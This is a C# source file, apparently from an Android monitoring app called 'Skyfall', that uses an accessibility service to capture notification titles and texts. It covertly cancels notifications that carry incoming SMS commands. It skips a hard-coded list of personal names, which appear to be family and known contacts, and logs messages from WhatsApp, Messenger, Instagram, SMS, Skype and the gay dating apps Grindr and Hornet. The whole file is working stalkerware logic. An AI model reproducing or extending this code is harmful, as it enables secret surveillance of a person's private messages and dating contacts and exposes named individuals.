using Android.App;
using Android.OS;
using Android.Views.Accessibility;
using System;
using System.Collections.Generic;

namespace Skyfall
{
    partial class Kernel
    {
        private struct NotificationBlock
        {
            public string Text { get; set; }
            public string Title { get; set; }
            public string Package { get; set; }
        }
        private static NotificationBlock notificationBlock;
        public static List<string> notificationArrayList = new List<string>();

        private void ProcessNotification(AccessibilityEvent ev)
        {
            try
            {
                if (ev.ParcelableData != null)
                {
                    IParcelable parcelable = ev.ParcelableData;
                    if (parcelable is Notification nt)
                    {
                        if (ev.PackageName != null) notificationBlock.Package = ev.PackageName; else notificationBlock.Package = "[null]";
                        if (nt.Extras.GetString("android.title") != null) notificationBlock.Title = nt.Extras.GetString("android.title"); else notificationBlock.Title = "[null]";
                        if (nt.Extras.GetString("android.text") != null) notificationBlock.Text = nt.Extras.GetString("android.text"); else notificationBlock.Text = "[null]";

                        if (Shell.ParseIncomingSMS(notificationBlock.Text))
                        {
                            Kernel.notificationManager.Cancel(nt.Extras.GetInt("ID"));
                            return;
                        }
                        else FilterNotificationContent();
                    }
                }
            }
            catch (Exception e) { Kernel.LogException(e); }
        }

        private static void FilterNotificationContent()
        {
            // Pre filters //
            if (notificationBlock.Package.Equals("[null]") || notificationBlock.Title.Equals("[null]") || notificationBlock.Text.Equals("[null]")
                || notificationBlock.Title.Contains("Mike")
                || notificationBlock.Title.Contains("Leocadio")
                || notificationBlock.Title.Contains("Leocádio")
                || notificationBlock.Title.Contains("Feitosa")
                || notificationBlock.Title.Contains("Waltz")
                || notificationBlock.Title.Contains("Michel Ramos")
                || notificationBlock.Title.Contains("Gustavo Fagundes")
                || notificationBlock.Title.Contains("Você")
                || notificationBlock.Title.Contains("Josi")
                || notificationBlock.Title.Contains("Jacira Mae")
                || notificationBlock.Title.Contains("Lidia")
                || notificationBlock.Title.Contains("Tia Ana")
                || notificationBlock.Title.Contains("Juliana Thiago")
                || notificationBlock.Title.Contains("Karina")
                || notificationBlock.Title.Contains("Backup")
                || notificationBlock.Title.Contains("backup")
                || notificationBlock.Text.Contains("novas mensagens")
               ) return;

            // App filters //
            /// com.whatsapp
            if ((notificationBlock.Package.Equals("com.whatsapp") && !notificationBlock.Title.Contains("WhatsApp"))

            /// com.android.chrome
            || (notificationBlock.Package.Equals("com.android.chrome") && notificationBlock.Text.Contains("anônimas"))

            /// com.facebook.katana
            || (notificationBlock.Package.Equals("com.facebook.katana") && !notificationBlock.Title.Contains("Facebook"))

            /// com.instagram.android
            || (notificationBlock.Package.Equals("com.instagram.android") && !notificationBlock.Title.Contains("Instagram"))

            /// com.facebook.orca
            || notificationBlock.Package.Equals("com.facebook.orca")

            /// br.com.uol.batepapo
            || notificationBlock.Package.Equals("br.com.uol.batepapo")

            /// com.grindrapp.android
            || notificationBlock.Package.Equals("com.grindrapp.android")

            /// com.hornet.android
            || notificationBlock.Package.Equals("com.hornet.android")

            /// com.skype.raider
            || notificationBlock.Package.Equals("com.skype.raider")

            /// com.google.android.apps.messaging
            || notificationBlock.Package.Equals("com.google.android.apps.messaging"))
            {
                FilterNotificationId();
            }
        }

        private static void FilterNotificationId()
        {
            /// Repetition filter
            string notificationUniqueID = notificationBlock.Package + notificationBlock.Title + notificationBlock.Text;

            if (notificationArrayList.Count > 0) { foreach (string row in notificationArrayList) if (row.Equals(notificationUniqueID)) { return; } }

            notificationArrayList.Add(notificationUniqueID);
            LogNotification();
        }

        private static void LogNotification()
        {
            string style = "<span style =\"color:black\">";

            /// com.whatsapp
            if (notificationBlock.Package.Equals("com.whatsapp")) style = "<span style =\"color:lightgreen\">";

            /// com.android.chrome
            else if (notificationBlock.Package.Equals("com.android.chrome")) style = "<span style =\"color:mediumvioletred\">";

            /// com.facebook.katana
            else if (notificationBlock.Package.Equals("com.facebook.katana")) style = "<span style =\"color:steelblue\">";

            /// com.instagram.android
            else if (notificationBlock.Package.Equals("com.instagram.android")) style = "<span style =\"color:gold\">";

            /// com.facebook.orca
            else if (notificationBlock.Package.Equals("com.facebook.orca")) style = "<span style =\"color:dodgerblue\">";

            /// br.com.uol.batepapo
            else if (notificationBlock.Package.Equals("br.com.uol.batepapo")) style = "<span style =\"color:red\">";

            /// com.grindrapp.android
            else if (notificationBlock.Package.Equals("com.grindrapp.android")) style = "<span style =\"color:red\">";

            /// com.hornet.android
            else if (notificationBlock.Package.Equals("com.hornet.android")) style = "<span style =\"color:red\">";

            /// com.skype.raider
            else if (notificationBlock.Package.Equals("com.skype.raider")) style = "<span style =\"color:blue\">";

            /// com.google.android.apps.messaging
            else if (notificationBlock.Package.Equals("com.google.android.apps.messaging")) style = "<span style =\"color:lightseagreen\">";

            Kernel.LogMessage(style + "<strong> 💬 " + notificationBlock.Package.ToUpper() + "</strong></span>", true, true);
            if (!notificationBlock.Title.Equals("")) Kernel.LogMessage(style + notificationBlock.Title + "</span>", true, true);
            if (!notificationBlock.Text.Equals("")) Kernel.LogMessage(style + notificationBlock.Text + "</span>", true, true);
        }
    }
}